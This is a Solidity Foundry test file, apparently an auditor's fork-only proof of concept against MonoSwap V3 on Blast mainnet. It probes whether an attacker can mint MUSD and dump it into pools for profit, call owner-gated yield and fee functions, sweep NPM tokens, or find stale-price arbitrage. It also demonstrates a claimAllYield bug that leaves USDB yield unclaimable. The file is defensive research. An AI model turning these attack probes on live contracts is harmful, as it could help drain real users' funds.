// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// ---------------------------------------------------------------------------
/// MonoSwap V3 (Blast) — read-only fork PoC. No mainnet transactions.
/// Fork of Blast mainnet (keyless public RPC); all state changes are local.
///
/// Questions answered:
///  1. Is the MUSD public deposit()/withdraw() live, and can a fresh attacker
///     mint MUSD and dump it into MonoSwap V3 pools for real assets? (E-U)
///  2. Are the privileged paths (claimAllYield / collectProtocol / protocol
///     yield) really owner-gated? (P)
///  3. Does a third party have any way to pull pool yield via USDB/WETH claim? (E-U)
///  4. Can anyone sweep stray tokens from the NPM? (E-U)
///  5. Is the main USDB/WETH pool priced at market (no stale-price arb)? (E-U)
/// ---------------------------------------------------------------------------

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IUSDB is IERC20Like {
    function configure(uint8 mode) external returns (uint256);
    function claim(address recipient, uint256 amount) external returns (uint256);
    function getClaimableAmount(address account) external view returns (uint256);
    function getConfiguration(address account) external view returns (uint8);
}

interface IMUSD is IERC20Like {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getReserves() external view returns (uint256, uint256, uint256);
    function paused() external view returns (bool);
    function monoswapRouter() external view returns (address);
    function mono() external view returns (address);
}

interface IPool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external returns (int256 amount0, int256 amount1);
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16, uint16, uint16, uint8 feeProtocol, bool unlocked);
    function liquidity() external view returns (uint128);
    function fee() external view returns (uint24);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function claimAllYield(address recipient) external;
    function collectProtocol(address recipient, uint128 amount0Requested, uint128 amount1Requested)
        external returns (uint128, uint128);
    function protocolFees() external view returns (uint128, uint128);
    function positions(bytes32 key) external view returns (uint128 liquidity, uint256 fg0, uint256 fg1, uint128 owed0, uint128 owed1);
}

interface INPM {
    function sweepToken(address token, uint256 amountMinimum, address recipient) external payable;
    function ownerOf(uint256 tokenId) external view returns (address);
    function totalSupply() external view returns (uint256);
    function positions(uint256 tokenId) external view returns (
        uint96 nonce, address operator, address token0, address token1, uint24 fee,
        int24 tickLower, int24 tickUpper, uint128 liquidity,
        uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0, uint128 tokensOwed1);
    function decreaseLiquidity(DecreaseLiquidityParams calldata params) external payable returns (uint256 amount0, uint256 amount1);
    function collect(CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1);
}

struct DecreaseLiquidityParams {
    uint256 tokenId;
    uint128 liquidity;
    uint256 amount0Min;
    uint256 amount1Min;
    uint256 deadline;
}
struct CollectParams {
    uint256 tokenId;
    address recipient;
    uint128 amount0Max;
    uint128 amount1Max;
}

contract MonoSwapV3PoC is Test {
    // ---- addresses (Blast mainnet) ----
    address constant FACTORY   = 0x48d0F09710794313f33619c95147F34458BF7C3b;
    address constant USDB      = 0x4300000000000000000000000000000000000003;
    address constant WETH      = 0x4300000000000000000000000000000000000004;
    address constant MUSD      = 0x837fE561e9C5DFa73F607fDa679295DBC2Be5E40;
    address constant POOL_MAIN = 0x0D44F3F22F917cc57368A6D30Ba18D5801789cD9; // USDB/WETH 0.3%
    address constant POOL_MUSD_A = 0x77e149741b4Aa14511324E4B554845063Ed038bd; // USDB/MUSD 0.3%
    address constant POOL_MUSD_B = 0x52b3B26541E5347BA22c17334a12cA759f221d8f; // USDB/MUSD 0.05%
    address constant POOL_MUSD_W = 0xfB45661DfFA7e768C1d03b5AA9Cd9E7f55032C1c; // WETH/MUSD 0.3%
    address constant NPM       = 0x0F0C3dE3cd5185454eDe5EF184bC9C7F4133fb90;
    address constant OWNER_EOA = 0x90a30F6a76D05Cbe5Dad714838E0b38d53d7f310;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    address attacker = address(0xA11CE);

    function forkRpc() internal view returns (string memory) {
        return vm.envOr("BLAST_RPC_URL", vm.envOr("RPC_URL_BLAST", string("https://rpc.blast.io")));
    }

    function setUp() public {
        vm.createSelectFork(forkRpc());
        vm.label(USDB, "USDB");
        vm.label(WETH, "WETH");
        vm.label(MUSD, "MUSD");
        vm.label(POOL_MAIN, "POOL_USDB_WETH");
        vm.label(POOL_MUSD_A, "POOL_USDB_MUSD_A");
        vm.label(POOL_MUSD_B, "POOL_USDB_MUSD_B");
        vm.label(POOL_MUSD_W, "POOL_WETH_MUSD");
        vm.label(NPM, "NPM");
        // test contract operates as a plain EOA-like actor
        vm.deal(address(this), 100 ether);
        // configure USDB to CLAIMABLE so balances are principal-only and predictable
        IUSDB(USDB).configure(2);
    }

    // ------------------------------------------------------------------
    // 0. live snapshot
    // ------------------------------------------------------------------
    function test_00_snapshot() public {
        emit log_named_uint("fork_block", block.number);
        emit log_named_uint("musd_totalSupply", IERC20Like(MUSD).totalSupply());
        (uint256 ures, uint256 mres,) = IMUSD(MUSD).getReserves();
        emit log_named_uint("musd_usdb_reserve", ures);
        emit log_named_uint("musd_mint_rate_musd_per_usdb", mres / ures);
        emit log_named_uint("musd_paused", IMUSD(MUSD).paused() ? 1 : 0);
        emit log_named_address("musd_monoswapRouter", IMUSD(MUSD).monoswapRouter());
        emit log_named_address("musd_mono", IMUSD(MUSD).mono());

        emit log_named_uint("pool_main_usdb", IERC20Like(USDB).balanceOf(POOL_MAIN));
        emit log_named_uint("pool_main_weth", IERC20Like(WETH).balanceOf(POOL_MAIN));
        emit log_named_uint("pool_musdA_usdb", IERC20Like(USDB).balanceOf(POOL_MUSD_A));
        emit log_named_uint("pool_musdB_usdb", IERC20Like(USDB).balanceOf(POOL_MUSD_B));
        emit log_named_uint("pool_musdW_weth", IERC20Like(WETH).balanceOf(POOL_MUSD_W));
        (uint128 pf0, uint128 pf1) = IPool(POOL_MAIN).protocolFees();
        emit log_named_uint("pool_main_protocolFees_usdb", pf0);
        emit log_named_uint("pool_main_protocolFees_weth", pf1);
        emit log_named_uint("pool_musdA_claimable_usdb", IUSDB(USDB).getClaimableAmount(POOL_MUSD_A));
    }

    // ------------------------------------------------------------------
    // 1. MUSD deposit is open (unprivileged) and mints at the reserve ratio
    // ------------------------------------------------------------------
    function test_01_musd_deposit_open() public {
        uint256 amount = 10e18; // 10 USDB
        fundUSDB(amount);
        uint256 before_ = IERC20Like(MUSD).balanceOf(address(this));
        IERC20Like(USDB).approve(MUSD, amount);
        IMUSD(MUSD).deposit(amount);
        uint256 minted = IERC20Like(MUSD).balanceOf(address(this)) - before_;
        emit log_named_uint("deposited_usdb", amount);
        emit log_named_uint("minted_musd", minted);
        assertGt(minted, 0, "MUSD mint failed");
        // expected: amount * totalSupply / usdbReserve
        (uint256 ures, uint256 mres,) = IMUSD(MUSD).getReserves();
        // reserves read AFTER deposit: rate is invariant, so recompute before
        uint256 exp = (amount * mres) / ures;
        emit log_named_uint("expected_musd_approx", exp);
    }

    // ------------------------------------------------------------------
    // 2. dump minted MUSD into the V3 pools for real assets
    // ------------------------------------------------------------------
    function test_02_musd_dump_usdb_pool_A() public {
        // fine scan with state snapshots (each size starts from the same fork state)
        uint256[9] memory sizes = [uint256(1e12), 1e14, 1e15, 1e16, 1e17, 5e17, 1e18, 5e18, 1e19];
        for (uint256 i = 0; i < sizes.length; i++) {
            uint256 snap = vm.snapshotState();
            uint256 depositAmt = sizes[i];
            fundUSDB(depositAmt);
            uint256 musdBefore = IERC20Like(MUSD).balanceOf(address(this));
            IERC20Like(USDB).approve(MUSD, depositAmt);
            IMUSD(MUSD).deposit(depositAmt);
            uint256 minted = IERC20Like(MUSD).balanceOf(address(this)) - musdBefore;
            uint256 usdbBefore = IERC20Like(USDB).balanceOf(address(this));
            (bool ok, uint256 usdbOut) = trySwapMUSDForAsset(POOL_MUSD_A, minted);
            usdbOut = IERC20Like(USDB).balanceOf(address(this)) - usdbBefore;
            emit log_named_uint("A: deposit_usdb", depositAmt);
            emit log_named_uint("A: minted_musd", minted);
            if (!ok) {
                emit log_string("A: swap reverted -> no extraction");
            } else {
                emit log_named_uint("A: usdb_out", usdbOut);
                if (usdbOut > depositAmt) {
                    emit log_named_uint("A: NET_PROFIT_usdb", usdbOut - depositAmt);
                } else {
                    emit log_named_uint("A: NET_LOSS_usdb", depositAmt - usdbOut);
                }
            }
            vm.revertToState(snap);
        }
    }

    function test_03_musd_dump_usdb_pool_B() public {
        uint256[6] memory sizes = [uint256(1e14), 1e15, 1e16, 1e17, 1e18, 1e19];
        for (uint256 i = 0; i < sizes.length; i++) {
            uint256 snap = vm.snapshotState();
            uint256 depositAmt = sizes[i];
            fundUSDB(depositAmt);
            uint256 musdBefore = IERC20Like(MUSD).balanceOf(address(this));
            IERC20Like(USDB).approve(MUSD, depositAmt);
            IMUSD(MUSD).deposit(depositAmt);
            uint256 minted = IERC20Like(MUSD).balanceOf(address(this)) - musdBefore;
            uint256 usdbBefore = IERC20Like(USDB).balanceOf(address(this));
            (bool ok, uint256 usdbOut) = trySwapMUSDForAsset(POOL_MUSD_B, minted);
            usdbOut = IERC20Like(USDB).balanceOf(address(this)) - usdbBefore;
            emit log_named_uint("B: deposit_usdb", depositAmt);
            if (!ok) {
                emit log_string("B: swap reverted -> no extraction");
            } else {
                emit log_named_uint("B: usdb_out", usdbOut);
                if (usdbOut > depositAmt) emit log_named_uint("B: NET_PROFIT_usdb", usdbOut - depositAmt);
                else emit log_named_uint("B: NET_LOSS_usdb", depositAmt - usdbOut);
            }
            vm.revertToState(snap);
        }
    }

    function test_04_musd_dump_weth_pool() public {
        uint256[6] memory sizes = [uint256(1e14), 1e15, 1e16, 1e17, 1e18, 1e19];
        for (uint256 i = 0; i < sizes.length; i++) {
            uint256 snap = vm.snapshotState();
            uint256 depositAmt = sizes[i];
            fundUSDB(depositAmt);
            uint256 musdBefore = IERC20Like(MUSD).balanceOf(address(this));
            IERC20Like(USDB).approve(MUSD, depositAmt);
            IMUSD(MUSD).deposit(depositAmt);
            uint256 minted = IERC20Like(MUSD).balanceOf(address(this)) - musdBefore;
            uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
            (bool ok,) = trySwapMUSDForAsset(POOL_MUSD_W, minted);
            uint256 wethOut = IERC20Like(WETH).balanceOf(address(this)) - wethBefore;
            emit log_named_uint("W: deposit_usdb", depositAmt);
            if (!ok) {
                emit log_string("W: swap reverted -> no extraction");
            } else {
                emit log_named_uint("W: weth_out", wethOut);
                // value of wethOut in USDB at market (~2519.6 USDB/WETH): profit only if > deposit
                emit log_named_uint("W: weth_out_value_usdb", (wethOut * 2519) / 1e18);
            }
            vm.revertToState(snap);
        }
    }

    // ------------------------------------------------------------------
    // 3. privileged paths must revert for a fresh attacker
    // ------------------------------------------------------------------
    function test_05_claimAllYield_owner_only() public {
        vm.startPrank(attacker);
        vm.expectRevert();
        IPool(POOL_MUSD_A).claimAllYield(attacker);
        vm.stopPrank();
        emit log_string("claimAllYield: non-owner reverted (as expected)");
    }

    function test_06_claimAllYield_owner_works() public {
        // The factory owner can claim pool yield (P). Show the claimable amount
        // and that the owner call succeeds (locally on the fork).
        uint256 claimableWeth = IUSDB(WETH).getClaimableAmount(POOL_MUSD_A);
        uint256 claimableUsdb = IUSDB(USDB).getClaimableAmount(POOL_MUSD_A);
        emit log_named_uint("poolA_claimable_weth", claimableWeth);
        emit log_named_uint("poolA_claimable_usdb", claimableUsdb);
        vm.prank(OWNER_EOA);
        IPool(POOL_MUSD_A).claimAllYield(OWNER_EOA);
        emit log_string("claimAllYield by factory owner succeeded (privileged path, P)");
    }

    function test_07_collectProtocol_non_owner_reverts() public {
        vm.prank(attacker);
        vm.expectRevert();
        IPool(POOL_MAIN).collectProtocol(attacker, type(uint128).max, type(uint128).max);
        emit log_string("collectProtocol: non-owner reverted (as expected)");
    }

    function test_08_third_party_cannot_claim_pool_yield() public {
        // USDB.claim() credits msg.sender's own account only.
        vm.startPrank(attacker);
        // attacker is not configured CLAIMABLE (default mode) -> revert
        vm.expectRevert();
        IUSDB(USDB).claim(attacker, 0);
        vm.stopPrank();
        emit log_string("USDB.claim by attacker reverted (yield cannot be redirected)");
        // even if the attacker configures itself CLAIMABLE, it can only claim its own yield
        vm.startPrank(attacker);
        IUSDB(USDB).configure(2);
        uint256 out = IUSDB(USDB).claim(attacker, 0);
        vm.stopPrank();
        emit log_named_uint("attacker_own_claim_return", out);
        emit log_string("attacker can only claim its own (zero) yield");
    }

    // ------------------------------------------------------------------
    // 4. NPM stray-token sweep
    // ------------------------------------------------------------------
    function test_09_npm_sweep_no_funds() public {
        uint256 npmUsdbBefore = IERC20Like(USDB).balanceOf(NPM);
        uint256 attBefore = IERC20Like(USDB).balanceOf(attacker);
        emit log_named_uint("npm_usdb_balance", npmUsdbBefore);
        vm.prank(attacker);
        INPM(NPM).sweepToken(USDB, 0, attacker);
        uint256 attAfter = IERC20Like(USDB).balanceOf(attacker);
        emit log_named_uint("attacker_gained_usdb", attAfter - attBefore);
        assertEq(attAfter - attBefore, 0, "no stray tokens");
    }

    // ------------------------------------------------------------------
    // 5. main pool is priced at market: 1 WETH -> USDB swap, compare
    // ------------------------------------------------------------------
    function test_10_main_pool_price_vs_market() public {
        // fund with 1 WETH (impersonate the main pool's own WETH holder)
        uint256 amountIn = 1e18;
        vm.prank(POOL_MAIN);
        IERC20Like(WETH).transfer(address(this), amountIn);
        uint256 usdbBefore = IERC20Like(USDB).balanceOf(address(this));
        swapWETHForUSDB(POOL_MAIN, amountIn);
        uint256 usdbOut = IERC20Like(USDB).balanceOf(address(this)) - usdbBefore;
        emit log_named_uint("main_pool_usdb_per_1_weth_after_fee", usdbOut);
        // market reference at fork block: WETH=$2507.69, USDB=$0.99527 -> 2519.6 USDB/WETH
        // profit only if usdbOut > 2519.6e18
        emit log_named_uint("market_usdb_per_weth", 2519e18);
        assertLt(usdbOut, 2520e18, "no stale-price arb on main pool");
    }

    // ------------------------------------------------------------------
    // 6. other real-asset pools: price vs market (fork-checked)
    // ------------------------------------------------------------------
    function test_11_ezeth_weth_pool_no_arb() public {
        address pool = 0x7B6b3EB3062c7D82DB47235E8Bc91f1F77BA3c4B; // ezETH/WETH 0.3%
        uint256 amountIn = 0.3e18;
        // impersonate a WETH holder (main pool) to fund
        vm.prank(POOL_MAIN);
        IERC20Like(WETH).transfer(address(this), amountIn);
        address t0 = IPool(pool).token0(); // ezETH
        address t1 = IPool(pool).token1(); // WETH
        require(t1 == WETH && t0 != WETH, "unexpected pair");
        uint256 ezBefore = IERC20Like(t0).balanceOf(address(this));
        IPool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, abi.encode(t0, t1));
        uint256 ezOut = IERC20Like(t0).balanceOf(address(this)) - ezBefore;
        emit log_named_uint("ezeth_out_for_0.3_weth", ezOut);
        // market: ezETH=$2721.11, WETH=$2507.69 -> 0.3 WETH = 0.32553 ezETH
        // profitable only if ezOut > 0.3255e18 * (1) -> arb would need ezOut > market
        emit log_named_uint("market_ezeth_for_0.3_weth", 325530000000000000);
        assertLt(ezOut, 325600000000000000, "no arb in ezETH/WETH pool");
    }

    function test_12_usdb_weth_pool_56ce_no_arb() public {
        address pool = 0x56Ce78755639eAFEd5Df91a030fcAc8ad908E1de; // USDB/WETH 0.05%, price off slot0
        // sell 0.005 WETH for USDB
        uint256 amountIn = 5e15;
        vm.prank(POOL_MAIN);
        IERC20Like(WETH).transfer(address(this), amountIn);
        uint256 usdbBefore = IERC20Like(USDB).balanceOf(address(this));
        (bool ok,) = trySwapWETHForUSDB(pool, amountIn);
        uint256 usdbOut = IERC20Like(USDB).balanceOf(address(this)) - usdbBefore;
        if (!ok) {
            emit log_string("56ce: swap reverted (no liquidity) -> no extraction");
            return;
        }
        emit log_named_uint("56ce: usdb_out_for_0.005_weth", usdbOut);
        emit log_named_uint("56ce: market_usdb_for_0.005_weth", 12598000000000000000);
        if (usdbOut > 12598000000000000000) {
            emit log_named_uint("56ce: PROFIT_usdb", usdbOut - 12598000000000000000);
        } else {
            emit log_named_uint("56ce: no_profit_deficit", 12598000000000000000 - usdbOut);
        }
    }

    function test_13_main_pool_reverse_no_arb() public {
        // sell 1000 USDB for WETH in the main pool
        uint256 amountIn = 1000e18;
        fundUSDB(amountIn);
        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
        address t0 = IPool(POOL_MAIN).token0(); // USDB
        address t1 = IPool(POOL_MAIN).token1(); // WETH
        // selling USDB = token0 in -> zeroForOne = true (price down)
        IPool(POOL_MAIN).swap(address(this), true, int256(amountIn), 4295128739 + 1, abi.encode(t0, t1));
        uint256 wethOut = IERC20Like(WETH).balanceOf(address(this)) - wethBefore;
        emit log_named_uint("main: weth_out_for_1000_usdb", wethOut);
        // market: 1000 USDB = 1000*0.99527/2507.69 = 0.39688 WETH
        emit log_named_uint("main: market_weth_for_1000_usdb", 396880000000000000);
        assertLt(wethOut, 397500000000000000, "no arb (reverse) on main pool");
    }

    function test_14_owner_claims_main_pool_yield() public {
        uint256 wethBefore = IERC20Like(WETH).balanceOf(OWNER_EOA);
        uint256 usdbBefore = IERC20Like(USDB).balanceOf(OWNER_EOA);
        vm.prank(OWNER_EOA);
        IPool(POOL_MAIN).claimAllYield(OWNER_EOA);
        uint256 gainedWeth = IERC20Like(WETH).balanceOf(OWNER_EOA) - wethBefore;
        uint256 gainedUsdb = IERC20Like(USDB).balanceOf(OWNER_EOA) - usdbBefore;
        emit log_named_uint("owner_gained_weth", gainedWeth);
        emit log_named_uint("owner_gained_usdb", gainedUsdb);
        emit log_string("P: owner claims min(weth_claimable, usdb_claimable) of each");
    }

    function test_15_usdb_yield_never_claimable() public {
        // The claimAllYield bug: it claims WETH first, then re-reads the (now zero)
        // WETH claimable amount and passes it to usdb.claim -> USDB is NEVER claimed.
        address pool = 0x75993a51FC9e8B7161c3f90Ee5acdb6E418CABcf; // WETH/BLSTE
        uint256 claimableWeth = IUSDB(WETH).getClaimableAmount(pool);
        uint256 claimableUsdb = IUSDB(USDB).getClaimableAmount(pool);
        emit log_named_uint("claimable_weth_before", claimableWeth);
        emit log_named_uint("claimable_usdb_before", claimableUsdb);
        uint256 w0 = IERC20Like(WETH).balanceOf(OWNER_EOA);
        uint256 u0 = IERC20Like(USDB).balanceOf(OWNER_EOA);
        vm.prank(OWNER_EOA);
        IPool(pool).claimAllYield(OWNER_EOA);
        uint256 gainedW = IERC20Like(WETH).balanceOf(OWNER_EOA) - w0;
        uint256 gainedU = IERC20Like(USDB).balanceOf(OWNER_EOA) - u0;
        emit log_named_uint("owner_gained_weth", gainedW);
        emit log_named_uint("owner_gained_usdb", gainedU);
        assertEq(gainedW, claimableWeth, "WETH yield claimed (P)");
        assertEq(gainedU, 0, "USDB yield never claimed (S)");
        emit log_string("S: USDB yield is permanently unclaimable via claimAllYield");
    }

    function test_17_main_pool_usdb_yield_stuck() public {
        // main pool has 13,327 USDB + 0.774 WETH claimable; owner claim leaves USDB at 0
        uint256 claimableUsdb = IUSDB(USDB).getClaimableAmount(POOL_MAIN);
        uint256 claimableWeth = IUSDB(WETH).getClaimableAmount(POOL_MAIN);
        emit log_named_uint("main_claimable_usdb", claimableUsdb);
        emit log_named_uint("main_claimable_weth", claimableWeth);
        uint256 u0 = IERC20Like(USDB).balanceOf(OWNER_EOA);
        vm.prank(OWNER_EOA);
        IPool(POOL_MAIN).claimAllYield(OWNER_EOA);
        uint256 gainedU = IERC20Like(USDB).balanceOf(OWNER_EOA) - u0;
        emit log_named_uint("main_owner_gained_usdb", gainedU);
        assertEq(gainedU, 0, "main pool USDB yield stuck");
        emit log_named_uint("main_usdb_stuck", claimableUsdb);
    }

    // ------------------------------------------------------------------
    // 7. H-O: position owners can still withdraw from the NPM
    // ------------------------------------------------------------------
    function test_16_position_owner_can_withdraw() public {
        uint256 tokenId = 11404; // MONO-V2/WETH position, liq 3.386e25
        address owner = INPM(NPM).ownerOf(tokenId);
        emit log_named_address("position_owner", owner);
        // non-owner cannot decrease liquidity
        vm.prank(attacker);
        vm.expectRevert();
        INPM(NPM).decreaseLiquidity(DecreaseLiquidityParams(tokenId, 1e18, 0, 0, block.timestamp + 100));
        // owner can
        vm.prank(owner);
        (uint256 a0, uint256 a1) = INPM(NPM).decreaseLiquidity(
            DecreaseLiquidityParams(tokenId, 1e18, 0, 0, block.timestamp + 100)
        );
        emit log_named_uint("owner_decrease_amount0", a0);
        emit log_named_uint("owner_decrease_amount1", a1);
        // owner can collect the freed tokens
        vm.prank(owner);
        (uint256 c0, uint256 c1) = INPM(NPM).collect(CollectParams(tokenId, owner, type(uint128).max, type(uint128).max));
        emit log_named_uint("owner_collect_amount0", c0);
        emit log_named_uint("owner_collect_amount1", c1);
        assertTrue(a0 > 0 || a1 > 0, "owner withdrawal produced nothing");
    }

    // ------------------------------------------------------------------
    // 8. H-O proof on the MAIN pool (the $104k pool): a real in-range
    //    position (tokenId 3366) can be withdrawn by its owner only.
    // ------------------------------------------------------------------
    function test_18_main_pool_position_owner_can_withdraw() public {
        uint256 tokenId = 3366; // main USDB/WETH 0.3%, in-range, liq 3.035e20
        address owner = INPM(NPM).ownerOf(tokenId);
        (,,,,,,, uint128 liq,,, uint128 owed0, uint128 owed1) = INPM(NPM).positions(tokenId);
        emit log_named_address("main_pos_owner", owner);
        emit log_named_uint("main_pos_liquidity", liq);
        emit log_named_uint("main_pos_owed0", owed0);
        emit log_named_uint("main_pos_owed1", owed1);
        // non-owner cannot touch it
        vm.prank(attacker);
        vm.expectRevert();
        INPM(NPM).decreaseLiquidity(DecreaseLiquidityParams(tokenId, 1e18, 0, 0, block.timestamp + 100));
        // owner can withdraw
        vm.prank(owner);
        (uint256 a0, uint256 a1) = INPM(NPM).decreaseLiquidity(
            DecreaseLiquidityParams(tokenId, 1e18, 0, 0, block.timestamp + 100)
        );
        emit log_named_uint("main_owner_decrease_amount0", a0);
        emit log_named_uint("main_owner_decrease_amount1", a1);
        vm.prank(owner);
        (uint256 c0, uint256 c1) = INPM(NPM).collect(CollectParams(tokenId, owner, type(uint128).max, type(uint128).max));
        emit log_named_uint("main_owner_collect_amount0", c0);
        emit log_named_uint("main_owner_collect_amount1", c1);
        assertTrue(c0 > 0 || c1 > 0, "main-pool owner withdrawal produced nothing");
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------
    function fundUSDB(uint256 amount) internal {
        // source: main USDB/WETH pool holds ~36.6k USDB; small perturbation only
        vm.prank(POOL_MAIN);
        IERC20Like(USDB).transfer(address(this), amount);
    }

    function swapMUSDForAsset(address pool, uint256 amountIn) internal {
        address t0 = IPool(pool).token0();
        address t1 = IPool(pool).token1();
        // selling MUSD (token1 in these pools) -> zeroForOne = false, price up
        require(t1 == MUSD, "unexpected token1");
        IPool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, abi.encode(t0, t1));
    }

    function trySwapMUSDForAsset(address pool, uint256 amountIn) internal returns (bool ok, uint256 out) {
        address t0 = IPool(pool).token0();
        address t1 = IPool(pool).token1();
        uint256 before_ = IERC20Like(t0).balanceOf(address(this));
        try IPool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, abi.encode(t0, t1)) {
            ok = true;
            out = IERC20Like(t0).balanceOf(address(this)) - before_;
        } catch {
            ok = false;
            out = 0;
        }
    }

    function trySwapWETHForUSDB(address pool, uint256 amountIn) internal returns (bool ok, uint256 out) {
        address t0 = IPool(pool).token0();
        address t1 = IPool(pool).token1();
        uint256 before_ = IERC20Like(USDB).balanceOf(address(this));
        try IPool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, abi.encode(t0, t1)) {
            ok = true;
            out = IERC20Like(USDB).balanceOf(address(this)) - before_;
        } catch {
            ok = false;
            out = 0;
        }
    }

    function swapWETHForUSDB(address pool, uint256 amountIn) internal {
        address t0 = IPool(pool).token0();
        address t1 = IPool(pool).token1();
        // pool token0 = USDB, token1 = WETH ; selling WETH -> zeroForOne = false
        require(t0 == USDB && t1 == WETH, "unexpected pair");
        IPool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, abi.encode(t0, t1));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        (address t0, address t1) = abi.decode(data, (address, address));
        if (amount1Delta > 0) {
            IERC20Like(t1).transfer(msg.sender, uint256(amount1Delta));
        }
        if (amount0Delta > 0) {
            IERC20Like(t0).transfer(msg.sender, uint256(amount0Delta));
        }
    }
}
